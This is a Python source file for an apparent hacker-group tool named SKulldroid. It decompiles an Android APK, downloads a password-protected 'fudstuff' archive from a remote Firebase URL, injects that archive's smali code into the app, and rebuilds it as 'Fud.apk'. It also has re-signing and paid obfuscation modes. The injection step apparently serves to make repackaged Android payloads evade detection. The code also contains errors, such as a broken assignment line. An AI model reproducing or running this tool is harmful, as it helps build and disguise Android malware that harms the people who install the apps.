import os
import sys
from time import sleep
from getpass import getpass
import subprocess
import webbrowser
# website_url = "https://t.me/TH3HARRY"
# website_url2 = "https://t.me/hidden_bros"
# website_url3 = "https://t.me/HSOCI3TY"
# webbrowser.open(website_url,website_url2,website_url3)

try:
    from colorama import Fore, Back, Style, init
except ModuleNotFoundError:
    os.system("pip3 install colorama")

try:
    from fontstyle import apply
except ModuleNotFoundError:
    os.system("pip3 install fontstyle")

try:
    from Crypto.PublicKey import RSA
except ModuleNotFoundError:
    os.system("pip3 install pycryptodome")

import hashlib
import base64
try:
    from tqdm import tqdm
except ModuleNotFoundError:
    os.system("pip3 install tqdm")
import threading
from time import time
import platform
import shutil

red = Fore.RED
cyan = Fore.CYAN
yellow = Fore.YELLOW
green = Fore.GREEN
magenta = Fore.MAGENTA
white = Fore.WHITE

back_red =      Back.RED
back_cyan =     Back.CYAN
back_yellow =   Back.YELLOW
back_green =    Back.GREEN
back_magenta =  Back.MAGENTA
back_white =    Back.WHITE
back_black =    Back.BLACK
back=blue =     Back.BLUE

STBRIGHT = Style.BRIGHT
STNORMAL = Style.NORMAL

violet = "\033[1;35m"
bg_bold_magenta = "\033[1;45m"
darkgreen = "\033[1;32m"
darkred = "\033[1;41m"
fg_to_bg = "\033[7m"
boldwhite = "\033[1;37m"
boldcyan = "\033[1;36m"
boldred = "\033[1;31m"
boldgreen = "\033[1;32m"
boldblue = "\033[1;34m"
blue = "\033[0;34m"
resetclr = "\033[0m"

codeyby =   apply("\033[6m  Code By ", 'bold/white')
arrow =     apply("\033[6m ⮞⮞⮞⮞ ", 'bold/Green')
harry =     apply("\033[6m HSOCIETY",'bold/red')

harryxcode = (f"{codeyby}"f"{arrow}"f"{harry}")
star = (white+"                                                   *"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*"+red+"*"+white+"*")

apktoolversion = "apktool_2.6.1.jar"
tmppath = "/tmp/.TxTxT/"


output_directory = "apkstub"
newApk = "Fud.apk" 
smali_dir1 = "bolts"
smali_dir2 = "net"
smali_dir3 = "okhttp3"
smali_dir4 = "org"
smali_dir5 = "com"
signapkv1 = "yoursignapk_v1.apk"
signapkv2 = "yoursignapk_v2.apk"
smali2 = "smali_classes2"
smali3 = "smali_classes3"
smali4 = "smali_classes4"
signerv2zipfile = "APksignv2.zip"
signerv2DIRfile = "APksignv2"
ziptoolpath  = "/usr/bin/7z"
fudzipfile = "fudstuff.zip"
fudzipdir = "fudstuff"
apktoolzipfile = "Apktool.zip"
apktoolzipdir = "Apktool"
apktoolpath = (f"{tmppath}/{apktoolzipdir}/Apktool/{apktoolversion}")
apktoolResoucespath = (f"{tmppath}/{apktoolzipdir}/Resources/")
def clear():
    os.system("clear")

def makedir(inputapk):
    try:
        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 1")
        sleep(1)
        if not os.path.exists(tmppath):
            os.makedirs(f"{tmppath}")

        if os.path.exists(tmppath):    
            os.system(f"cp {inputapk} {tmppath}")
            os.chdir(f"{tmppath}")
            download_fudstuff()
            download_apktool()
            Apk_payload_Decompile(inputapk)

        else:
            pass

    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()

def unzip_and_remove(file,dir):
    try:
        if not os.path.exists(f"{ziptoolpath}"):
            print("Package not found")
            subprocess.check_call("sudo apt-get install -y p7zip-full > /dev/null 2>&1", shell=True)
    except Exception as e:
        print(f"Error: {e}")

    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
    try:
        unzipcom = (f"7z x -p'Hiddenbros@#Hsociety$harry' {file}")
        rununzipcom = subprocess.run(unzipcom,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
        sleep(2)
        if os.path.exists(f"{dir}"):
            os.remove(f"{file}")
        else:
            print("Something Went Wrong")
            exit(1)
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
def download_fudstuff():
    try:
        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 2")
        url = "https://firebasestorage.googleapis.com/v0/b/xxx-xxx-5dc04.appspot.com/o/fudstuff.zip?alt=media&token=717c1bcf-41a4-49fa-99e6-2a4971b4bfae"
        curlcommand = (f"curl -L '{url}' -o {fudzipfile} ")
        runcurlcommand = subprocess.run(curlcommand,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 3")
        unzip_and_remove(f"{fudzipfile}",f"{fudzipdir}")
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
def download_apktool():
    try:
        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 4")
        url = "https://firebasestorage.googleapis.com/v0/b/xxx-xxx-5dc04.appspot.com/o/Apktool.zip?alt=media&token=6fbc0819-4c0f-43d4-a5d4-90f604199139"
        curlcommand = (f"curl -L '{url}' -o {apktoolzipfile} ")
        runcurlcommand = subprocess.run(curlcommand,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 5")
        unzip_and_remove(f"{apktoolzipfile}",f"{apktoolzipdir}")
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
def apktoolcheck():
    try:
        pathcheck = f"{apktoolpath}"
        return os.path.exists(pathcheck)
    
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
def smali_1():
    try:
    #1 dir
        source_path = (f"{fudzipdir}/smali/{smali_dir1}")
        destination_path = (f"{tmppath}/{output_directory}/smali/{smali_dir1}/")

        try:
            shutil.copytree(source_path, destination_path)
            print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 8")
            sleep(2)
        except Exception as e:
            print(f"Error: {e}")
        except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
        # 2 dir
        source_path2 = (f"{fudzipdir}/smali/{smali_dir2}")
        destination_path2 = (f"{tmppath}/{output_directory}/smali/{smali_dir2}/")

        try:
            shutil.copytree(source_path2, destination_path2)
            print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 9")
            sleep(2)
        except Exception as e:
            print(f"Error: {e}")
        except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
        # 3 dir
        source_path3 = (f"{fudzipdir}/smali/{smali_dir3}")
        destination_path3 = (f"{tmppath}/{output_directory}/smali/{smali_dir3}/")

        try:
            shutil.copytree(source_path3, destination_path3)
            print(white+" \nPHASE"+resetclr+red+" 10")
            sleep(2)
        except Exception as e:
            print(f"Error: {e}")
        except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()

        # 4 dir
        source_path4 = (f"{fudzipdir}/smali/{smali_dir4}")
        destination_path4 = (f"{tmppath}/{output_directory}/smali/{smali_dir4}/")

        try:
            shutil.copytree(source_path4, destination_path4)
            print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 11")
            sleep(2)
        except Exception as e:
            print(f"Error: {e}")
        except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
        # 5 dir
        source_path5 = (f"{fudzipdir}/smali/{smali_dir5}")
        destination_path5 = (f"{tmppath}/{output_directory}/smali/{smali_dir5}/")

        try:
            shutil.copytree(source_path5, destination_path5)
            print(white+" \nPHASE"+resetclr+red+" 12")
            sleep(2)
        except Exception as e:
            print(f"Error: {e}")
        except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
def smali_2():
    try:
        SMALI2_source_path = (f"{fudzipdir}/{smali2}")
        SMALI2_destination_path = (f"{tmppath}/{output_directory}/{smali2}")

        try:
            shutil.copytree(SMALI2_source_path, SMALI2_destination_path)
            print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 13")
            sleep(2)
        except Exception as e:
            print(f"Error: {e}")
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
def smali_3():
    try:
        SMALI3_source_path = (f"{fudzipdir}/{smali3}")
        SMALI3_destination_path = (f"{tmppath}/{output_directory}/{smali3}")

        try:
            shutil.copytree(SMALI3_source_path, SMALI3_destination_path)
            print(white+" \nPHASE"+resetclr+red+" 14")
            sleep(2)
        except Exception as e:
            print(f"Error: {e}")
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
def smali_4():
    try:
        SMALI4_source_path = (f"{fudzipdir}/{smali4}")
        SMALI4_destination_path = (f"{tmppath}/{output_directory}/{smali4}")

        try:
            shutil.copytree(SMALI4_source_path, SMALI4_destination_path)
            print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 15")
            sleep(2)
        except Exception as e:
            print(f"Error: {e}")
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
def combined_smali():
    try:
        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 7")
        sleep(2)
        smali_1()
        smali_2()
        smali_3()
        smali_4()
        if os.path.exists(f"{tmppath}/{fudzipdir}/{smali4}"):
            print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 16")
            sleep(2)
            shutil.rmtree(f"{fudzipdir}")
        else:
            print("something went wrong")
            exit(1)
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()

# def apk_decompile(inputapk,outdir):
    
#     if apktoolcheck() == False:
#             print(red+" Apktool Not Found")
#             exit(1)
#     else:
#         pass
#     Decompile_com = (f"java -jar {apktoolpath} d -f --only-main-classes  -o {outdir} {inputapk}  ") 
#     try:
#         rundecompile_com = subprocess.run(Decompile_com,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
#         decomstcode = rundecompile_com.returncode
#         decomsterr = rundecompile_com.stderr
#         if decomstcode == 0:
#             print("successfully Decompile")
#             try:
#                 # smali_1()
#                 # smali_2()
#                 # smali_3()
#                 # smali_4()
#                 print("compiling process")
#                 Apk_payload_Compile()
#             except Exception as r:
#                 print(r)
#         else:
#             print(decomsterr)

#     except Exception as f:
#         print(f)

def Apk_payload_Decompile(inputapk):
    try:
        if apktoolcheck() == False:
            print(red+" Apktool Not Found")
            exit(1)
        else:
            pass
        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 6")
        Decompile_com = (f"java -jar {apktoolpath} d -f --only-main-classes  -o {output_directory} {inputapk}  ") 
        try:
            rundecompile_com = subprocess.run(Decompile_com,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
            decomstcode = rundecompile_com.returncode
            decomsterr = rundecompile_com.stderr
            if decomstcode == 0:
                try:
                    combined_smali()
                    Apk_payload_Compile()
                except Exception as r:
                    print(r)
                except KeyboardInterrupt :
                    print(red+"FUCK OFF\n\n")
                    shutil.rmtree(f"{tmppath}")
                    sleep(2)
                    exit()
            else:
                print(decomsterr)

        except Exception as f:
            print(f)
        except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()

def Apk_payload_Compile():
        try:
            print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 17")
            sleep(2)
            print('\n')
            aaptpath = input(white+"[ "+red+"AAPT"+white+" | "+red+"AAPT2"+white+" ]"+red+" >> "+green)
            if aaptpath.lower().strip() == "aapt":
                Compile_com = (f"java -jar {apktoolpath}  b -f --use-aapt -o {newApk} {output_directory}") 
                try:
                    rundecompile_com = subprocess.run(Compile_com,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
                    comstcode = rundecompile_com.returncode
                    comsterr = rundecompile_com.stderr
                    if comstcode == 0:
                        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 18")
                        sleep(1)
                        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 19")
                        sleep(1)
                        print(STBRIGHT+white+" \nFINAL PHASE"+resetclr+red+" 20")
                        os.system(f"cp {newApk} $HOME/SKulldroid")
                        sleep(2)
                        shutil.rmtree(f"{tmppath}")
                        sleep(2)
                        print(green+" \nTHANKS FOR YOUR PATIENTS :)")
                        print(white+" \nCHECK YOUR DIRECTORY THE FILE IS SAVE WITH THIS NAME"+blue+" >> "+green+f"{newApk}")
                        exit()
                    else:
                        print(comsterr)

                except Exception as f:
                    print(f) 
                except KeyboardInterrupt :
                    print(red+"FUCK OFF\n\n")
                    shutil.rmtree(f"{tmppath}")
                    sleep(2)
                    exit()
            if aaptpath.lower().strip() == "aapt2":
                Compile_com = (f"java -jar {apktoolpath}  b -f --use-aapt2 -o {newApk} {output_directory}") 
                try:
                    rundecompile_com = subprocess.run(Compile_com,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
                    comstcode = rundecompile_com.returncode
                    comsterr = rundecompile_com.stderr
                    if comstcode == 0:
                        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 18")
                        sleep(1)
                        print(STBRIGHT+white+" \nPHASE"+resetclr+red+" 19")
                        sleep(1)
                        print(STBRIGHT+white+" \nFINAL PHASE"+resetclr+red+" 20")
                        os.system(f"cp {newApk} $HOME/SKulldroid")
                        sleep(2)
                        shutil.rmtree(f"{tmppath}")
                        sleep(2)
                        clear()
                        banner()
                        print('\n')
                        print('\n')
                        print(green+" \nTHANKS FOR YOUR PATIENTS :)")
                        print(white+" \nCHECK YOUR DIRECTORY THE FILE IS SAVE WITH THIS NAME"+blue+" >> "+green+f"{newApk}")
                        exit()
                    else:
                        print(comsterr)

                except Exception as f:
                    print(f)    
                except KeyboardInterrupt :
                    print(red+"FUCK OFF\n\n")
                    shutil.rmtree(f"{tmppath}")
                    sleep(2)
                    exit()
        except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
def Apk_Compile(outdir,apkname):
        try:
            print('\n')
            aaptpath = input(white+" [ "+red+"AAPT"+white+" | "+red+"AAPT2"+white+" ]"+red+" >> "+green)
            if aaptpath.lower().strip() == "aapt":
                Compile_com = (f"java -jar   b -f --use-aapt -o {apkname} {outdir}") 
                try:
                    rundecompile_com = subprocess.run(Compile_com,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
                    comstcode = rundecompile_com.returncode
                    comsterr = rundecompile_com.stderr
                    if comstcode == 0:
                        print("successfully Compiled")
                        exit()
                    else:
                        print(comsterr)

                except Exception as f:
                    print(f) 
                except KeyboardInterrupt :
                    print(red+"FUCK OFF\n\n")
                    shutil.rmtree(f"{tmppath}")
                    sleep(2)
                    exit()
            if aaptpath.lower().strip() == "aapt2":
                Compile_com = (f"java -jar {apktoolpath}  b -f --use-aapt2 -o {newApk} {output_directory}") 
                try:
                    rundecompile_com = subprocess.run(Compile_com,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
                    comstcode = rundecompile_com.returncode
                    comsterr = rundecompile_com.stderr
                    if comstcode == 0:
                        print("successfully Compiled")
                        exit()
                    else:
                        print(comsterr)

                except Exception as f:
                    print(f)
                except KeyboardInterrupt :
                    print(red+"FUCK OFF\n\n")
                    shutil.rmtree(f"{tmppath}")
                    sleep(2)
                    exit()
        except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()
# user_id = int(subprocess.check_output(["id", "-u"]))


# if not  user_id == 0:
#     print("Program needed to root permission")
#     exit(1)

# if "-harry" not in sys.argv:
#     print("Argument '-harry' needed.")
#     exit(1)    
# else:
#     pass

def download_apksignerV2():
    try:
        url= "https://firebasestorage.googleapis.com/v0/b/xxx-xxx-5dc04.appspot.com/o/APksignv2.zip?alt=media&token=5c2219b0-97bb-4dee-b36c-23adf286e064"
        curlcommand = (f"curl -L '{url}' -o {signerv2zipfile} ")
        runcurlcommand = subprocess.run(curlcommand,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
        unzip_and_remove(f"{signerv2zipfile}",f"{signerv2DIRfile}")
        if os.path.exists(f"{signerv2DIRfile}/com"):
            os.system(f"cp -r {signerv2DIRfile}/com {tmppath}" )
            sleep(2)
        else:
            pass
    except Exception as e:
        print(e)
    except KeyboardInterrupt :
        print(red+"FUCK OFF\n\n")
        shutil.rmtree(f"{tmppath}")
        sleep(2)
        exit()
def apk_signer2(inputapk):
    try:
        download_apksignerV2()
        sleep(2)
        signv2com = (f"java -Xmx1500m -cp .:'/tmp/.TxTxT/APksignv2/dex/*' com.cooltrickshome.helper.RunProgramDex signApk '{inputapk}' '{signapkv2}'")            
        runsignv2com = subprocess.run(signv2com,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
        comstcode = runsignv2com.returncode
        comsterr = runsignv2com.stderr
        if comstcode == 0:
            os.system(f"cp {signapkv2} $HOME/SKulldroid")
            sleep(2)
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            clear()
            banner()
            print('\n')
            print(green+" \nTHANKS FOR YOUR PATIENTS :)")
            print(white+" \nCHECK YOUR DIRECTORY THE FILE IS SAVE WITH THIS NAME"+blue+" >> "+green+f"{signapkv2}")
            exit()
        else:
            print(comsterr)
    except KeyboardInterrupt :
        print(red+"FUCK OFF\n\n")
        shutil.rmtree(f"{tmppath}")
        sleep(2)
        exit()
def download_apksignerV1():
    try:
        url= "https://firebasestorage.googleapis.com/v0/b/xxx-xxx-5dc04.appspot.com/o/Apktool.zip?alt=media&token=6fbc0819-4c0f-43d4-a5d4-90f604199139"
        curlcommand = (f"curl -L '{url}' -o {apktoolzipfile} ")
        runcurlcommand = subprocess.run(curlcommand,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
        unzip_and_remove(f"{apktoolzipfile}",f"{apktoolzipdir}")
    except Exception as e:
        print(e)
    except KeyboardInterrupt :
        print(red+"FUCK OFF\n\n")
        shutil.rmtree(f"{tmppath}")
        sleep(2)
def apk_signer(inputapk):
    try:
        if apktoolcheck() == False:
            download_apksignerV1()
        else:
            pass
        signcom = (f"java -jar {apktoolResoucespath}apksigner.jar sign  --key {apktoolResoucespath}apkeasytool.pk8  --cert {apktoolResoucespath}/apkeasytool.pem  --v4-signing-enabled false --out {signapkv1} {inputapk}")
        runsigncom = subprocess.run(signcom,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True, text=True )
        comstcode = runsigncom.returncode
        comsterr = runsigncom.stderr
        if comstcode == 0:
            os.system(f"cp {signapkv1} $HOME/SKulldroid")
            sleep(2)
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            clear()
            banner()
            print('\n')
            print(green+" \nTHANKS FOR YOUR PATIENTS :)")
            print(white+" \nCHECK YOUR DIRECTORY THE FILE IS SAVE WITH THIS NAME"+blue+" >> "+green+f"{signapkv1}")
            exit()
        else:
            print(comsterr)
    except KeyboardInterrupt :
        print(red+"FUCK OFF\n\n")
        shutil.rmtree(f"{tmppath}")
        sleep(2)
        exit()
def helpmenu():
    print("' -b ' = FOR BANNER")
    print("' skull ' = FOR RUN")

def banner():
    print(boldred+"\033[6m ╔"+resetclr+boldblue+STBRIGHT+"══════════════════════════════════════════════════════"+resetclr+boldred+"\033[6m╗"+resetclr)
    print(boldcyan+" ║"+resetclr+red+"\t AUTHOR"+boldblue+"   | "+green+"   HARRY "+resetclr+boldblue+"         |  "+resetclr+white+"#"+red+"HSOCIETY"+boldcyan+"      ║")
    print(boldcyan+" ║"+resetclr+red+"\t TOOL  "+boldblue+"   | "+green+"   SKulldroid "+resetclr+boldblue+"    |  "+resetclr+white+"#"+red+"HSOCIETY"+boldcyan+"      ║")
    # print(boldcyan+" ║"+resetclr+red+"\t TOOL  "+boldblue+"   | "+green+"   DARKNDROID "+resetclr+boldblue+"    |  "+resetclr+white+"#"+red+"HSOCIETY"+boldcyan+"      ║")
    print(boldcyan+" ║"+resetclr+red+"\t VERSION "+boldblue+" | "+green+"   1.1 "+resetclr+boldblue+"           |  "+resetclr+white+"#"+red+"HSOCIETY"+boldcyan+"      ║")
    print(boldcyan+" ║"+resetclr+red+"\t CONTACT "+boldblue+" | "+green+"   t.me/TH3HARRY "+resetclr+boldblue+" |  "+resetclr+white+"#"+red+"HSOCIETY"+boldcyan+"      ║")
    print(boldcyan+" ║"+resetclr+red+"\t CONTACT "+boldblue+" | "+green+"   t.me/S4MH4CK3R "+resetclr+boldblue+"|  "+resetclr+white+"#"+red+"HSOCIETY"+boldcyan+"      ║")
    print(boldcyan+" ║"+resetclr+red+"\t GROUP "+boldblue+"   | "+green+"   t.me/HSOCI3TY "+resetclr+boldblue+" |  "+resetclr+white+"#"+red+"HSOCIETY"+boldcyan+"      ║")
    print(boldcyan+" ║"+resetclr+red+"\t ABOUT "+boldblue+"   | "+green+"   APK MODIFIER "+resetclr+boldblue+"  |  "+resetclr+white+"#"+red+"HSOCIETY"+boldcyan+"      ║")
    print(boldgreen+"\033[6m ╚"+resetclr+boldblue+STBRIGHT+"══════════════════════════════════════════════════════"+resetclr+boldgreen+"\033[6m╝"+resetclr)

def menu():
    banner()
    print(boldcyan+"     │"+resetclr+red+"└──» "+white+" MODE "+boldcyan+"1"+blue+" >> "+green+"APk Signv1"+white+"        ✔️"+cyan+"ꜰʀᴇᴇ"+resetclr+red+" «──┘"+boldcyan+"│")
    print(boldcyan+"     │"+resetclr+red+"└──» "+white+" MODE "+boldcyan+"2"+blue+" >> "+green+"APk Signv2"+white+"        ✔️"+cyan+"ꜰʀᴇᴇ"+resetclr+red+" «──┘"+boldcyan+"│")
    print(boldcyan+"     │"+resetclr+red+"└──» "+white+" MODE "+boldcyan+"3"+blue+" >> "+green+"APK Align"+white+"         ✔️"+cyan+"ꜰʀᴇᴇ"+resetclr+red+" «──┘"+boldcyan+"│")
    print(boldcyan+"     │"+resetclr+red+"└──» "+white+" MODE "+boldcyan+"4"+blue+" >> "+green+"APK Decompile"+white+"     ✔️"+cyan+"ꜰʀᴇᴇ"+resetclr+red+" «──┘"+boldcyan+"│")
    print(boldcyan+"     │"+resetclr+red+"└──» "+white+" MODE "+boldcyan+"5"+blue+" >> "+green+"APK Compile"+white+"       ✔️"+cyan+"ꜰʀᴇᴇ"+resetclr+red+" «──┘"+boldcyan+"│")
    print(boldcyan+"     │"+resetclr+red+"└──» "+white+" MODE "+boldcyan+"6"+blue+" >> "+green+"DEX Confusion"+white+"     💀"+yellow+".ᴠɪᴘ"+resetclr+red+" «──┘"+boldcyan+"│")
    print(boldcyan+"     │"+resetclr+red+"└──» "+white+" MODE "+boldcyan+"7"+blue+" >> "+green+"DEX AntiConfusion"+white+" 💀"+yellow+".ᴠɪᴘ"+resetclr+red+" «──┘"+boldcyan+"│")
    print(boldcyan+"     │"+resetclr+red+"└──» "+white+" MODE "+boldcyan+"8"+blue+" >> "+green+"RES Confusion"+white+"     💀"+yellow+".ᴠɪᴘ"+resetclr+red+" «──┘"+boldcyan+"│")
    print(boldcyan+"     │"+resetclr+red+"└──» "+white+" MODE "+boldcyan+"9"+blue+" >> "+green+"APK Obfuscation"+white+"   💀"+yellow+".ᴠɪᴘ"+resetclr+red+" «──┘"+boldcyan+"│")
    print(resetclr+red+"      ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    if "-b" in sys.argv:
        os.system("python3 skull.py")
        os.system("python3 androidban.py")
    try:
        menu_options = int(input(STBRIGHT+white+"\n      Which Mode Do You Like"+red+" >>> "+cyan))
        if menu_options == 1:
            clear()
            banner()
            print('\n')
            apkpath = input(white+" Enter Apk Name"+red+" >> "+green)
            if not os.path.exists(apkpath):
                print(red+" APK Doest Not Exist")
                exit(1)
            
            if not os.path.exists(f"{tmppath}"):
                os.makedirs(f"{tmppath}")
                pass
            if os.path.exists(f"{tmppath}"):
                os.system(f"cp {apkpath} {tmppath}")
                os.chdir(f"{tmppath}")
                apk_signer(apkpath)
        
        if menu_options == 2:
            clear()
            banner()
            print('\n')
            apkpath = input(white+" Enter Apk Name"+red+" >> "+green)
            if not os.path.exists(apkpath):
                print(red+" APK Doest Not Exist")
                exit(1)
            if not os.path.exists(f"{tmppath}"):
                os.makedirs(f"{tmppath}")
                pass
            if os.path.exists(f"{tmppath}"):
                os.system(f"cp {apkpath} {tmppath}")
                os.chdir(f"{tmppath}")
                apk_signer2(apkpath)
            else:
                print("Something went wrong")
                exit(1)

        if menu_options == 3:
            print("\n      UNDER MAINTAINCE")
        if menu_options == 4:
            print("\n      UNDER MAINTAINCE")
        if menu_options == 5:
            print("\n      UNDER MAINTAINCE")
        if menu_options == 6:
            clear()
            banner()
            print('\n')
            apkpath = input(white+" Enter Apk Name"+red+" >> "+green)
            if not os.path.exists(apkpath):
                print(red+" APK Doest Not Exist")
                exit(1)
            else:
                pass
            print(magenta+STBRIGHT+"\nNow Sit Back , Relax And Wait For Our Magic | We Are Working On Your Application")
            makedir(apkpath)
        if menu_options == 7:
            print("\n      SUBCRIPTIONS MUST")
            exit(1)
        if menu_options == 8:
            print("\n      SUBCRIPTIONS MUST")
            exit(1)
        if menu_options == 9:
            print("\n     SUBCRIPTIONS MUST")
            exit(1)
        else:
            print("\n     Invalid Options")
            exit(1)
    except ValueError as interr :
                clear()
                menu()
    except KeyboardInterrupt :
            print(red+"FUCK OFF\n\n")
            shutil.rmtree(f"{tmppath}")
            sleep(2)
            exit()      
        
clear()
menu()

